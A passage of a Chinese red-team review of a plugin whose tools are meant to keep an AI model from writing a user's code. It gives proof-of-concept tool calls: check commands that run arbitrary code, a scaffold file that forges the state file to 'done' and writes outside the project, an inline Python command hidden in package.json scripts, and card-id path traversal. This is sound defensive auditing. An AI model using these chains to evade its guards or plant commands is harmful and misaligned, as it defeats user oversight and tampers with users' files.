# lib/tools.js + lib/index.js 对抗性审查（红队报告）

- 审查对象：`lib/tools.js`、`lib/index.js`，以及它们依赖的 `state.js` / `cards.js` / `checks.js` / `scaffold.js` / `project.js` / `git.js` / `policy.js` / `format.js`
- **基线**：commit `99591fe`（`lib/` 最后一次提交）。审查期间另一路并发修复一直在动工作树，所以第 0 节、第 1–3 节的「最终状态」标注和第 7 节**全部对着**定稿工作树**复核过**。正文里的复现代码按 `99591fe` 写，行号可能已偏移，但每条都写成了可以照抄的命令；已被修掉的条目保留了原始证据，并标注【已修】。
- 判决依据：`docs/CONTRACT.md`（§2 事件表 / §3 payload / §5 错误消息）、`PLAN.md` §4 工具表、§5 守卫与「不代写」、§7 自动提交、`docs/INTERFACES.md` §4/§5、`docs/API-FACTS.md` §2/§3
- 视角：**如果我是想绕过这个模式的坏模型**——我不读提示词，只看工具签名、参数校验和落盘路径，找「能写、能执行、能伪造状态」的最短链路
- 方法：直接 `import` 仓库模块跑真实代码，优先走 `registerTools()` 拿到的**真工具对象**（含 `execute`），而不是单独调纯函数——因为绕过点在工具层的参数校验和落盘顺序上
- **本报告未改动任何源文件**。`lib/` 不在我的写作用域，我只输出结论。

复现脚本在 `%TEMP%\plando-review\`（`probe*.mjs`），仓库内不留文件。最有用的几个：

| 脚本 | 作用 |
|---|---|
| **`probe-final5.mjs`** | **一条命令跑完本报告全部发现，输出「还成不成立」的表（§7 数据即来自它）** |
| `probe72.mjs` | 只打 `checks.validateCommand`，看现在放行/拒绝了什么 |
| `probe49.mjs` | 只打 `scaffold` 的 `scripts` 值校验（G2，唯一还活着的高危） |
| `probe53.mjs` | 只打「哪些拒绝会写日志」（M2） |
| `probe71.mjs` | 实测 npm 链路在 Windows 上 ENOENT（平台差异） |

---

## 0. 结论速览

> **先说结论：只剩一条高危没闭合，但它足以卡住 v0.1.0。**
> 写报告期间另一路改动一直在修：G1（任意代码执行）、G3（路径穿越）、G4（`dir` 未校验）**现在都实测关上了**；M1 / M2 / M3 / M6 / L1 / L2 / L3 / L5 / L6 也已修。**但 G2 的 `scripts` 值校验仍然是 denylist**——AI 仍能通过 `plando_scaffold` 往用户的 `package.json` 里埋一条命令（加一个无害参数就绕过正则，见 §8.5），而这条命令会在用户自己 `npm test` / `npm install` 时执行。加上 M4（零产出也能到 done），**判决仍是 fix-first**。

| # | 问题 | 严重度 | 能否从正常流程触发 | 当前状态（对着最终工作树复核过） |
|---|---|---|---|---|
| **G1** | `plando_card action=declare` + `plando_check action=run` = **任意代码执行** | **高** | 是（build 阶段两次调用） | **已修**。11 条攻击命令（`node -e` / `cmd /c` / `node --eval=` / `--require=` / `python -c`（空格+黏连）/ `--test-reporter` / `--run` / `pip install` / `cargo run` / `java -jar`）**全部在 declare 阶段被拒**（§7 / §8.7）。修法是白名单 + 参数名归一 + 贴值前缀 + 按解释器区分的 `-c` |
| **G2** | `plando_scaffold` 的 `scripts` 值只走正则 denylist，一个参数就绕过 | **高** | 是（一次 `plando_scaffold`） | **仍成立**。白名单收窄到 7 个声明式配置、`vite.config.*` / `README.md` / `index.html` / `scripts.postinstall` 全拒、`curl \| sh` / `node -e` 也拒了——**但 `python -X utf8 -c "…"` / `py -3 -c "…"` / `npm install <包>` 照样落盘成功**，用户 `npm test` 即执行（§8.5，含端到端复现）。触发链见下方说明 |
| **G3** | 卡 id 未净化 → `.plando/cards/${id}.md` 路径穿越 | **高** | 是（模型随手给 id） | **已修**（`state.js` 的 `CARD_ID_RE` + `writeText` 的 containment） |
| **G4** | `dir` 参数未校验 → `init` 落在任意目录并销毁用户 `IDEA.md`；`dir:'..'` 改写守卫观测点 | **高** | 是（一次 `plando_project init`） | **已修**：`dir` 非绝对路径直接拒；`init` 遇到目录里已有 `IDEA.md` 等模式产物直接拒；`noteActiveDir` 不再在 `resolveDir` 里调（实测 `dir=".."` 后 `activeProjectDir` 仍是空串） |
| M1 | `saveState` 在 `renderArtifacts` 之前 → 渲染失败、状态已推进、日志无记录 | 中 | 是（产物同名目录占位） | **已修**：顺序改成 render → save，实测渲染失败时 `stage` 停在 `tech` 不动 |
| M2 | 拒绝留痕只覆盖 `plando_transition` | 中 | 是（任何被拒调用） | **已修**：`plando_transition` / `plando_check` / `plando_card` / `plando_scaffold` / `plando_idea` / `plando_project` / `plando_clarify` 的拒绝现在全部留痕，实测 8 次不同拒绝 → 8 行日志（§7） |
| M3 | 错误文本超契约 §5 的 160 字上限 | 中 | 是（路径长一点就触发） | **已修**：5 个工具在长路径 + 坏 state 下实测全部 160 字 |
| M4 | 证据只校验「字数/不是纯空话」，不校验「真的做过」；**零代码可达 done** | 中 | 是（正常收尾） | **部分已修**：`{kind:'check',summary:'我懂了'}` 已被拒；但 `{kind:'check',summary:'跑了 vite build，退出码 0'}`（**从没跑过**）照样 `卡片 c1 已 done`；全卡 downgrade → `ship_pass{explain:'好了'}` → `stage=done`，项目里只有 `IDEA.md`+`TECH.md` |
| M5 | `paused` 只是装饰：暂停后仍能推进，`drop` 会清掉 `paused` | 中 | 是 | **契约已消解**：`CONTRACT.md` §2 现在写明「不冻结状态机」。遗留：`policy.js` 的「先 resume 再推进」文案与新契约矛盾 |
| M6 | 阶段名硬编码「边做边学」；提示不存在的 `plando_card action=verify` | 中 | 是 | **已修**：`checks.js` 的 `head` 改成空串；两处 `action=verify` 都改成 `action=done`。实测 ship 阶段报错不再出现「边做边学」 |
| L1 | `choose_build` 允许重复卡 id → 卡 md 互相覆盖 + 卡片**死锁** | 低 | 是（模型漏写 id） | **已修**（`firstDuplicate`） |
| L2 | 重复 tech id：`find` 取第一条 → `scaffold` 报「归属不是 ai」 | 低 | 是 | **已修**（`firstDuplicate`） |
| L3 | 灵感 id 是 `idea_${Date.now()}`：同毫秒必撞号 | 观察 | 概率低 | **已修**（`nextIdeaId` 加后缀去重） |
| L4 | 无输入规模上限：`clarify answers` 2MB 写进 state.json | 观察 | 是 | **仍成立**（`state.json` → 2 098 443 字节） |
| L5 | 白名单里的 `README.md` / `index.html` 是**用户内容文件**，写它们等于代写 | 观察 | 是 | **已修**（已从白名单移除） |
| L6 | `VERIFY.md` 不在 `git.ARTIFACT_PATHS` → `autoCommit` 漏提交 | 低 | 是 | **已修**（`ARTIFACT_PATHS` 含 `VERIFY.md`，`test/git.test.js` 断言也同步了） |
| L7 | `clarify record` 只落 state，不重渲染、不 autoCommit | 观察 | 是 | **仍成立** |
| L8 | 守卫按名字前缀分类、未知名放行 | 观察 | 否（预设没挂这些工具） | **部分已修**：`fs_write` / `mcp__*__write_file` / `powershell` / `cmd` / `exec` / `spawn_teammate` 现在都拒；**`node` / `present` 仍放行**（这两个确实无害，但说明「未知名」的兜底方向仍是放行） |

**G2 为什么还卡着（这条要看清楚）**：洞本身是「`scaffold` 落盘的内容没校验住」，它**不需要** `plando_check` 配合就成立。§8.5 里有完整的端到端复现（probe-final11）：

```
① plando_scaffold  content = {"scripts":{"test":"python -X utf8 -c \"open('PWNED.txt','w').write('…')\""}}
   → 已写 package.json。                       ← 落盘成功
② 用户在自己终端敲 npm test
   → status = 0，PWNED.txt 存在 = true
```

- 就算 `plando_check` 自己跑不动（Windows 上 `spawnSync('npm')` 会 ENOENT，因为 `npm` 其实是 `npm.cmd`），**用户之后手动 `npm test` / `npm install` 走 `cmd /c`，照样执行**（probe-final9 实测：`cmd /c npm test` + `node -e "rmSync('src.js')"` → `src.js 还在 = false`）。
- 在 Linux / macOS 上（README 说 CI 跑 ubuntu + windows）`/usr/bin/npm` 是真实可执行文件，`npm test` 就**在 `plando_check` 这一层直接打通**。

**修法很明确**：`scaffold.validateContent` 里对 `scripts.*` 的值直接调 `checks.validateCommand`（我逐条验过，同一批 payload 在那边 7/7 全拒），剩下的 `node evil.js` 这类「跑已有文件」再补一条「只允许两段式白名单命令」。

**否定结论（查过，不是 bug，列出来免得别人再花时间）**：见 §4。其中最重要的一条：**伪造 `state.json` 骗不过守卫**——`policy.js` 对四个危险能力是单调拒绝，state 只影响拒绝文案，不影响放不放行（实测：伪造 `stage=done` 也照样拒 `write`/`bash`/`run_code`/`subagent`）。

---

## 1. 高危

### G1　`declare` + `run` = 任意代码执行，`plando_check` 是唯一 shell 面　【最终复核：已修，见 §7 / §8.7】

> **最终状态（对着定稿工作树）：已修。** 下面保留的是**发现问题时的原始证据**——这是本报告的核心发现，也是「这个模式能不能成立」的判定点，值得完整留档。修复后被 11 条攻击命令回归验证，全部在 `declare` 阶段被拒；`checks.js` 现在有真正的 `ALLOWED_COMMANDS` 白名单 + 参数名归一 + 贴值前缀 + `RUN_SUBCOMMANDS` / `RUN_FLAGS` / `SAFE_PY_MODULES`。
>
> **但对这一段要保留两个警惕**：① 这套校验是「黑名单列举危险形状」的混合体，不是纯白名单（§8.7 末尾）；② **它一条测试都没有**（§5），下次改 `checks.js` 会静默破防。

这是本报告的核心发现，也是「这个模式能不能成立」的判定点。

威胁模型前提：预设 `cordis.patch.yml` **没有挂** `bash` / `pwsh` / `write` / `edit` / `subagent`（`tool-fs` 显式 `write:false, edit:false`），所以守卫 deny 什么其实不重要——模型手上根本没有那些工具。**但 `plando_check` 会 `spawnSync` 任意可执行文件，`plando_scaffold` 会写文件，这两个是 `plando_*` 前缀，守卫按第 1 行直接放行（`policy.js:114`）。**

`checks.js:86 declareCheck` 只做三件事：id 非空、command 非空、`[...command].length <= 500`。**没有命令白名单、没有可执行文件白名单、没有 `-e` / `-c` / `/c` 的拦截**。`checks.js:108 tokenize` 只是「不做变量展开和管道」，`spawnSync(argv[0], argv.slice(1), { shell:false })` 依然会执行 `argv[0]` 这个任意程序。

**最小复现（写用户业务代码，两次调用）**：

```js
// 前置：项目已在 build 阶段（clarify_done → idea_ok → tech_ok → choose_build，正常流程 4 步）
plando_card  { action:'declare', dir, id:'c1',
               command:'node -e "require(\'node:fs\').writeFileSync(\'index.html\',\'<h1>AI 代写</h1>\')"' }
plando_check { action:'run', dir, name:'c1' }
```

实测输出（probe24）：

```
1) declare → 已为卡片 c1 声明检查命令：node -e "require('node:fs').writeFileSync('index.html','<h1>AI 代写</h1>')"
2) run     → · 检查 c1：通过｜退出码 0
3) index.html 现在 = "<h1>AI 代写</h1>"        ← 用户自己写的 `<!-- 用户自己写的 -->` 被覆盖
```

**期望**：`plando_check` 只跑「用户在卡片里声明的、可判定的检查命令」（README 对外承诺原文：「**只执行用户在卡片里声明过的检查命令**，不接受临时传入的任意命令」）。模型不该能把 `declare` 当成「写文件 / 执行任意程序」的入口。

**实际**：`declare` 接受任何字符串，`run` 执行它。三步之外没有任何东西挡着：

```js
// ① 写项目内任意文件（覆盖用户业务代码）
command: 'node -e "require(\'node:fs\').writeFileSync(\'index.html\',\'<h1>AI 代写</h1>\')"'
// ② 写项目目录外任意路径（实测 OUTSIDE.txt 存在 = true）
command: 'node -e "require(\'node:fs\').writeFileSync(\'C:/…/OUTSIDE.txt\',\'x\')"'
// ③ 真 shell（shell:false 挡不住 cmd.exe 自己的 /c）
command: 'cmd /c "echo from-shell > shell-out.txt"'
// ④ 甚至不需要 node：任何 exe 都行
command: 'powershell -NoProfile -Command "…"'
```

实测 ③：

```
cmd /c run → · 检查 c1：通过｜退出码 0
shell-out.txt = "from-shell \r\n"
```

**为什么「契约上」看起来没问题、实际是洞**：README 的说法是「不接受临时传入的任意命令」——技术上成立，`plando_check` 确实只跑 `checks.json` 里的。**但 `plando_card action=declare` 就是往 `checks.json` 写任意命令的入口，而且它在 build 阶段对任意 id 都开放**（见下）。等于「锁装了，钥匙就插在锁上」。

**叠加放大：`declare` 不校验卡是否存在。** `cardTool` 只 `requireString(input,'id')`，然后直接 `declareCheck(dir, id, command)`，不去 `state.cards` 里找。实测：

```
B) declare 一个不存在的卡 id → 已为卡片 ghost-key 声明检查命令：node -e "console.log(1)"
B) run ghost-key → · 检查 ghost-key：通过｜退出码 0
B) checks.json keys = [ 'c1', 'ghost-key' ]   state.cards ids = [ 'c1' ]
```

所以「每张卡一条检查」这个设计意图也是空的：检查命令和卡完全解耦，模型可以随时加任意第 N 条命令并执行。

**最坏情况**：G1 + G2 合起来可以完整伪造整个模式（probe6 实测）：

```js
// 第 1 步：scaffold 写出白名单内的 vite.config.js，内容是任意 JS
plando_scaffold { dir, path:'vite.config.js', techId:'t1', content:`
  import fs from 'node:fs';
  fs.writeFileSync('app.js', '// 由 AI 写入\nconsole.log("AI wrote this")');   // 代写业务代码
  const p = '.plando/state.json'; const s = JSON.parse(fs.readFileSync(p,'utf8'));
  s.stage = 'done';                                                            // 伪造状态机
  s.terminal = { kind:'done', reason:'', at:new Date().toISOString() };
  s.cards.forEach(c => { c.status='done'; c.evidence={kind:'check',summary:'x',at:''} });
  fs.writeFileSync(p, JSON.stringify(s,null,2));
  fs.writeFileSync('<项目外路径>/ESCAPED.txt','escaped');                       // 越界写
` }
// 第 2 步：把 vite.config.js 当检查命令跑
plando_card  { action:'declare', dir, id:'c1', command:'node vite.config.js' }
plando_check { action:'run', dir, name:'c1' }
```

实测：

```
1) scaffold vite.config.js → 已写 vite.config.js。
3) run → · 检查 c1：通过｜退出码 0
结果：
  · 用户业务代码 app.js 现在 = "// 由 AI 通过脚手架+检查链路写入\nconsole.log(\"AI wrote this\");"
  · state.stage 被改成 = done | 卡片状态 = [ 'done' ]
  · 项目目录外 ESCAPED.txt 存在 = true
  · plando_status 现在说： · 阶段：已完成（done） | · 下一步：项目已结束；要重做请传 reopen（带 reason）
```

一次 `scaffold` + 一次 `declare` + 一次 `run`，把「不代写」「状态是唯一真相源」「产物由 state 渲染」三条一起废掉，而且 `plando_status` 事后**看起来一切正常**——它读的就是被伪造的 state。

**修法（按代价从低到高）**：

1. 最小：`declareCheck` 加 argv 首元素白名单（`node` / `npm` / `npx` / `pnpm` / `python` / `pytest` / `cargo` / `go` / `vitest` / `jest` …），并且命令里出现 ` -e ` / ` -c ` / ` --eval` / ` -Command` / ` cmd ` / ` powershell ` / ` bash ` / ` sh ` 一律拒。零依赖、十行左右。
2. 更好：不让模型传命令，改成 `declare` 传 `package.json` 里的 script 名（`npm test` / `npm run lint`），命令本体在用户看得见的文件里。
3. 最稳：`runCheck` 前再自检一遍 argv，并把「本次要执行的完整 argv」写进日志，让用户能看到 AI 到底跑了什么。

另外 **`declare` 必须校验 `id` 在 `state.cards` 里**（`ghost-key` 这种一律拒）。

**修复过程中的中间态（历史记录）**：

那批改动把第 1 条修法**只做了一半**——加了 `ALLOWED_COMMANDS` 白名单 + 黑名单，方向对，但**匹配是「整 token 精确相等」**，所以当时只挡住了空格形式：

| 命令 | 当时 | 结果 |
|---|---|---|
| `node -e "…"` | **拒绝** | `命令里的「-e」会让检查变成执行任意代码` |
| `cmd /c echo` | **拒绝** | `「cmd」是 shell，检查命令不允许调 shell` |
| `node --eval="…"` | **放行** | `· 检查 c1：通过｜退出码 0`，**`index.html` 被覆盖** |
| `python -c"…"` | **放行** | `· 检查 c1：通过｜退出码 0`，**`PY.txt` 被创建** |
| `node --require=./pre.cjs --test` | **放行** | `· 检查 c1：通过｜退出码 0`，**`REQ.txt` 被创建**（预加载即执行） |

`--print=`（等号形式）实测**不走副作用**（Node 把它当未知参数），所以那条是隐患不是可用链路；但 `--eval=` / `--require=` / `--import=` / `-r` / `python -c` 当时都是真链路。

**最终复核（probe-final5）：上面四条全部被拒**。修复分三步走完：

1. 长开关的等号形式归一（`--eval=…` → 比较 `--eval`），见 §8.2；
2. `--require` / `--import` / `--loader` / `--test-reporter` 进黑名单，见 §8.3；
3. 黏连形式**按解释器分开**（`node -c` 是语法检查，`python -c` 是内联执行）——`GLUED_FLAGS_BY_BASE`，见 §8.7。

再加上 `RUN_SUBCOMMANDS`（`pip install` / `cargo run` / `go run` / `dotnet run`）、`RUN_FLAGS`（`java -jar`）、`SAFE_PY_MODULES`（`python -m <任意模块>`）三道，`declare` 现在挡得住 11 类攻击命令。

`ghost-key`（declare 未知卡 id）**已修**：`plando：卡片 ghost 不存在——下一步：先 action=list 看真实卡 id`。

具体的绕过与修法演进见 **§8.2 / §8.3 / §8.4 / §8.7**。

### G2　`plando_scaffold` 的 `scripts` 值校验是 denylist，一个参数就绕过　【仍成立，见 §7 / §8.5】

`scaffold.js` 的**路径**防护做得相当扎实（绝对路径 / `..` / 白名单 / `owner==='ai'` / realpath / 符号链接逐级查 / 不覆盖已有不同内容 / 原子写）。**内容**校验这一版也补了不少：白名单从「含 `vite.config.js`」收窄到 7 个声明式配置、`scripts` 的键白名单、`scripts` 值的 `SCRIPT_VALUE_DENY` 正则、`dependencies` 的版本白名单。方向全对。

**问题只剩最后一格**：`scripts` 的值用的是**正则 denylist**，而 denylist 只拦「已知形状」。

```js
const SCRIPT_VALUE_DENY = Object.freeze([
  /\bnode\s+(-e|--eval|-p|--print)\b/i,     // 要求 node 后**紧跟**开关
  /\b(?:python|python3|py)\s+-c\b/i,        // 要求 python 后**紧跟** -c
  /\b(?:curl|wget)\b/i,
  /\|\s*(?:sh|bash)\b/i,
  ...
]);
```

在 `python` 和 `-c` 之间插一个无害参数，正则就不匹配了：

```
python -X utf8 -c "…"     ← -X 是你的老朋友，完全合法
py -3 -c "…"              ← -3 也是日常用法
```

**这条不需要 G1 配合**：用户下次 `npm test` / `npm install` 就会执行。这是「AI 不代写，但 AI 在你机器上预埋了一条命令」。

期望：`plando_scaffold` 只生成**声明式配置**，且 `scripts.*` 的值必须是一条**可被程序化判定为「跑检查」的命令**——最省事的做法就是直接调 `checks.validateCommand`（同仓已有、且实测能挡住这批 payload）。

修法（**当前工作树已修的部分 / 还剩的部分**）：

- ✅ 从白名单删掉 `vite.config.js` / `vite.config.ts`（现在只剩 7 个声明式配置：`package.json` / `tsconfig.json` / `.gitignore` / `.env.example` / `pyproject.toml` / `requirements.txt` / `Cargo.toml`）；`README.md` / `index.html` 也一并删了（L5）；
- ✅ `package.json` 解析后校验 `scripts` 的**键**：`SAFE_SCRIPT_KEYS` 只允许 `test`/`tests`/`lint`/`build`/`dev`/`start`/`typecheck`/`check`/`format`/`test:unit`/`test:e2e`，`scripts.postinstall` 实测被拒；
- ✅ `scripts` 的**值**挡住了「直接执行」形态：`node -e "…"`、`curl … | sh`、`bash -c …` 实测都被拒；
- ✅ `dependencies` 的 URL / `git+` / `file:` 被拒（`SAFE_VERSION_RE`）——这条修得比 `scripts` 好；
- ❌ **但 denylist 被一个参数绕过**：`python -X utf8 -c "…"`、`python -u -c`、`python -I -c`、`py -3 -c`、`npm install <包>` 全部落盘成功（§8.5，含端到端复现）。

复核命令：`node %TEMP%\plando-review\probe-final11.mjs`（端到端）/ `probe-final6.mjs`（逐条 payload）。

### G3　卡 id 未净化 → `.plando/cards/${id}.md` 路径穿越　【当前工作树已修，见 §7】

> 这条在 `99591fe` 上成立，**当前工作树里已被并发改动修掉**（`state.js:128 CARD_ID_RE = /^[A-Za-z0-9_-]{1,40}$/` + `tools.js:151 writeText` 的 containment 抛错）。下面保留原始证据与修法建议，作为「为什么必须两层都加」的记录。

`tools.js:312`：

```js
const rel = path.join('.plando', 'cards', `${card.id}.md`);
written.push(writeText(dir, rel, papers.renderCard(state, card)));
```

`writeText`（`tools.js:147`）：

```js
const file = path.join(path.resolve(dir), rel);   // 没有 containment 检查
```

而 `state.js:452` 的 `choose_build` 接受**任意字符串**当卡 id（`isNonEmptyString(card.id)` 才用，否则自动编号——但 `'../../README'` 是非空字符串），`validateChooseBuild`（`state.js:259`）**完全不校验 `card.id`**。

**复现 ①（覆盖项目内文件）**：

```js
plando_transition { event:'choose_build', payload:{ cards:[
  { id:'../../README', techIds:['t1'], title:'覆盖 README' }   // t1 已在 tech_ok 里
]}}
```

`.plando/cards/../../README.md` → `path.join` 归一化成 `README.md` → 落点 `<项目根>/README.md`。实测（probe4 Q1）：

```
Q1) 项目根 README.md 现在: "# 覆盖 README\n\n- 卡 id：../../README\n- 覆盖 TECH 项：t1（HTML）\n- 状态：待"
Q1) 文件头 12 字: "# 覆盖 README\n"
```

**复现 ②（写到项目目录外）**：

```js
{ id:'../../../../PWNED-deep', techIds:['t1'], title:'深层穿越' }
```

实测（probe2 #1）：

```
1) choose_build: 已推进：decide → build（choose_build）
1) 落点: C:\Users\…\plando-probe2-kOFpZX\PWNED-deep.md
1) 项目根 = C:\Users\…\plando-probe2-kOFpZX\escape\proj | 在项目内: false
1) 文件存在: true | 前 30 字: "# 深层穿越\n\n- 卡 id：../../../../PWN"
```

**注意限制条件（不夸大）**：后缀永远是 `.md`，所以只能覆盖以 `.md` 结尾的目标；卡 id 里带盘符会因 `mkdir` 失败而「意外 fail-closed」（`ENOENT: mkdir '…\.plando\cards'`）。但只要目标文件名以 `.md` 结尾（README / 自己的 IDEA.md / 任何笔记），就能覆盖；带足够多 `../` 就能出项目根。

**修法（两处都要加）**：

1. `validateChooseBuild` 校验 `card.id`：`/^[A-Za-z0-9_-]{1,32}$/`，且整批 id 唯一（顺带修 L1）；
2. `writeText` 加 containment：`const root = path.resolve(dir); const file = path.resolve(root, rel); if (file !== root && !file.startsWith(root + path.sep)) throw new Error(errText(...))`。第 2 条是兜底，防将来别的地方再拼出穿越路径。

**当前工作树的修法和我建议的一致**（`state.js:128` 加 `CARD_ID_RE = /^[A-Za-z0-9_-]{1,40}$/` + `tools.js:151` 的 containment）。复核结果（probe28）：`'../../README'` / `'sub/evil'` / `'C:/abs'` / `'..'` / `'a b'` 五种 id 全部被拒：`plando：现在是「选路」阶段，事件参数不对，第 1 张卡的 id 只能用字母、数字、- 和 _，长度 1–40——下一步：…`。

唯一遗留：`writeText` 抛的错**没有过 `errText` 截断**（`tools.js:155` 直接拼字符串），路径很长时会再触发 M3。建议改成 `throw new Error(errText('产物路径跑到项目目录外了', '检查 payload 里的 id / 文件名有没有 ../ 或盘符'))`——注意别用 `fail()`，它要求的是「抛」，而 `writeText` 在 `run()` 的 try 里也能被接住。

### G4　`dir` 参数完全未校验 → 任意目录落盘 + 销毁用户手写产物　【最终复核：已修，见 §7】

> **最终状态（对着定稿工作树）：已修。** 下面三份复现都是发现问题时的原始证据。修复后实测：`init` 到已有 `IDEA.md` 的目录直接拒（`…里已经有 IDEA.md——立项后会把它们当成模式产物覆盖。换一个空目录…`），用户的 `IDEA.md` 一字未动；`dir='..'` 被`dir 必须是绝对路径（收到「..」）`挡住；`activeProjectDir` 保持空串。

`tools.js:115 resolveDir` 只做 `path.resolve(picked)`，不校验：

- 是不是绝对路径（`'.'` / `'..'` 都接受）；
- 是不是一个「项目」（有没有 `.plando/state.json`，或是不是空目录）；
- 是不是在用户预期的工作区里。

**复现 ①（销毁用户手写 IDEA.md）**：

```js
// 用户桌面上有个重要目录，里面放着自己写的笔记和一份手写的 IDEA.md
plando_project    { action:'init', dir:'C:/Users/me/Desktop/important-docs', name:'借用' }
plando_transition { event:'clarify_done', dir:'C:/Users/me/Desktop/important-docs', payload:{…} }
```

实测（probe21）：

```
init → 已立项：借用（…\victim）
IDEA.md 是否已被覆盖（init 时）: # 我手写的项目想法      ← init 不动它
clarify_done → 已推进：clarify → idea（clarify_done）
IDEA.md 现在首行: # 借用                                 ← 被插件渲染覆盖，用户内容永久丢失
```

`initProject` 的保护是「已有 `.plando/state.json` 就拒」（`project.js:181`），**但对「目录里已有同名的 `IDEA.md`」毫无防护**。而 `dir` 又完全由模型给。坏模型想毁掉用户的某个文件，只需要 `init` 到那个目录 + 一次 `clarify_done`。

**复现 ②（把守卫的观测点挪走）**：

```js
plando_status { dir:'..' }
```

实测（probe8 F / probe21）：

```
F) dir 传 ".." → · 读不出项目状态：plando：A:\AI\.plando\state.json 不存在——…
F) 之后 activeProjectDir = A:\AI
```

`noteActiveDir` 在 `resolveDir` 里被**每个**工具调用（包括只读的 `plando_status`），所以一次调用就能把守卫之后读的状态文件指到任意目录。

**重要澄清（这条不是绕过）**：即使攻击者能在 `A:\AI\.plando\state.json` 放一份伪造状态，也**骗不过守卫**——`policy.js` 对 `fs-write / shell / dynamic-code / subagent` 是单调拒绝，state 只影响拒绝文案（见 §4-N1）。所以复现 ② 的实际危害是「守卫输出里显示的阶段可能是假的」+「真实项目 paused 状态被遮住」，不会放开任何写工具。配合 G1 才有意义：`dir` 不校验让「写哪个项目」变成模型随便挑。

**修法**：

- `resolveDir` 要求 `path.isAbsolute(picked)`，否则 `fail('dir 必须是绝对路径', …)`；
- `plando_project action=init` 在「目录非空且没有 `.plando/`」时拒，或至少检测 `IDEA.md / TECH.md / VERIFY.md / HANDOFF.md / .plando/` 已存在时拒；
- `noteActiveDir` 只在 `loadState` 成功 / `initProject` 成功**之后**调用，不要放在 `resolveDir` 里（读失败也污染观测点不合理）。

**修复过程中的中间态（历史记录）**：**当时一条都没做**。

```
init 到用户目录 → 已立项：借用（C:\…\Desktop\important-docs）
clarify_done   → 已推进：clarify → idea
IDEA.md 首行   → "# 借用"           ← 用户手写的「# 我手写的项目想法」永久丢失
dir=".." 之后  → activeProjectDir = A:\AI
```

**最终复核（probe-final5 / probe70）**：三条修法全落实了——

| 修法 | 实测 |
|---|---|
| `resolveDir` 要求绝对路径 | `dir='.'` / `'..'` / `'sub/dir'` → `plando：dir 必须是绝对路径（收到「..」）——下一步：传项目根目录的完整路径，如 D:\work\my-app` |
| `init` 检测已有模式产物 | 目录里有手写 `IDEA.md` → `plando：<dir> 里已经有 IDEA.md——立项后会把它们当成模式产物覆盖。换一个空目录，或先把这些文件挪走。`，`IDEA.md` 首行**仍是** `"# 我手写的项目想法"` |
| `noteActiveDir` 移出 `resolveDir` | `dir='..'` 之后 `activeProjectDir` 仍是 `""` |

这是修复得最干净的一条——三处改动全在提议的位置，没有引入新的拒错文案问题。

---

## 2. 中危

### M1　`saveState` 在 `renderArtifacts` 之前：渲染失败 → 状态已推进、日志无记录　【当前工作树已修，见 §7】

> 修法就是把我下面写的「正确顺序」直接落实：`afterTransition` 现在第一行是 `renderArtifacts`，抛错就不再 `saveState`。实测渲染失败时 `stage` 停原地不动。**这条不影响判决，保留作为回归依据。**

`tools.js:319`：

```js
function afterTransition(dir, state, event, deps, extra = {}) {
  const saved = deps.project.saveState(dir, state);      // ① 先落盘
  const files = renderArtifacts(dir, saved, deps);       // ② 再渲染（会抛）
  appendLog(dir, deps, { kind:'transition', event, … }); // ③ 再记日志（到不了）
  const commit = autoCommit(dir, deps, …);               // ④ 再提交（到不了）
```

**复现**：把 `TECH.md` 换成一个同名目录，然后正常推进：

```js
fs.rmSync(path.join(dir,'TECH.md'), { force:true });
fs.mkdirSync(path.join(dir,'TECH.md'));          // 目录占位
plando_transition { event:'tech_ok', dir, payload:TECH }
```

实测（probe14）：

```
返回给模型的文本:
plando：EISDIR: illegal operation on a directory, open '…\proj\TEC。——下一步：先调 plando_status 确认阶段与项目路径，再按参数说明重试

磁盘 stage = decide （已从 tech 推进到 decide）
log 行数 before=3 after=3，本次推进有没有留痕: 没有
plando_status 说阶段 = · 阶段：选路（decide）
重试 tech_ok → plando：现在是「选路」阶段，还不在技术拆解阶段——下一步：用 plando_transition 传 choose_verify / choose_build / choose_handoff 推进
```

三个后果叠加：

1. **状态已推进**（tech → decide），产物没更新，`TECH.md` 还是旧目录；
2. **日志没有这行**（模型和用户事后都看不出这次推进发生过）；
3. 报错文本是「EISDIR…open '…\TEC。」——路径被 `errText` 从中间截断（`\TECH.md` 变 `\TEC`），既不是人话也没有「下一步该干什么」的有效信息；模型**照提示重试 `tech_ok` 会被拒**（因为已经在 decide），于是它只能猜 `revise`。

更糟的变体（probe13 B）：如果占位的是 `IDEA.md`，`clarify_done` 成功 → 然后模型照提示重试，会**再跨一阶**，中间那一阶等于没经任何确认：

```
B2) idea_ok → 已推进：idea → tech（idea_ok）     ← 报错的同时 stage 已经是 tech
B3) 模型按提示重试 tech_ok → plando：EISDIR…      ← 又推进到 decide
B3) stage = decide （再进一阶；中间那阶等于没确认）
```

期望：要么「渲染失败 → 不落盘、不推进、报一条可操作的 plando 错误」，要么「先渲染到内存再统一落盘」。现在的顺序是最坏的那种。

修法：`afterTransition` 改成 `renderArtifacts(渲染) → saveState → appendLog → autoCommit`，并且把渲染异常包成 `errText('产物落盘失败（TECH.md 被目录占位）', '先处理该路径再重试，本次没有推进')`。

### M2　拒绝留痕只覆盖 `plando_transition`　【最终复核：已修，见 §7】

> **最终状态：已修。** 8 类不同拒绝实测全部留痕（`card done 坏证据` / `card start 未知卡` / `scaffold 白名单外` / `scaffold 未知 tech` / `check 未声明` / `idea drop 不存在` / `project open 不存在` / `transition 非法事件` → log +8 行）。下面是发现问题时的原始证据。

`PLAN.md:103` 原文：「日志 | `<projectDir>/.plando/log.jsonl` | **每次推进/拒绝/降级留痕**」。`CONTRACT.md:235` 只硬性要求非法转移写 `{at,kind:'reject',event,from,reason}`。

`99591fe` 上只有 `transitionTool`（`tools.js:442`）写 reject；`plando_card` / `plando_scaffold` / `plando_clarify` / `plando_check` 的拒绝**直接 `fail()` 抛错，什么都不写**。

实测（probe8 C）：连续制造 6 种拒绝 → **只新增 1 行**日志（transition 那条）：

```
C) 6 次拒绝 → 日志新增 1 行；新增的 kind = [ 'reject/tech_ok' ]
```

6 次分别来自：`card done` 证据非法、`card start` 卡不存在、`scaffold` 非白名单路径、`scaffold` 错误 techId、`clarify record` 在错误阶段、非法 transition。

probe4 Q8 更极端：4 次拒绝 → **0 行**。

**为什么这是中危而不是低**：这正是坏模型最喜欢的区域——`plando_card` 的 `done` / `downgrade` 是「把卡糊过去」的主要入口，而它被拒时不留任何痕迹。用户在 `log.jsonl` 里看不到「AI 试过用假证据收卡」。

修法：把 `fail()` 签名扩展成 `fail(why, next, { log: {kind:'reject', tool, action, …} })`，在 `run()` 的 catch 里统一补日志（需要把 `dir` / 工具名从闭包传进去），或在每个工具里拒绝分支前显式 `appendLog`。

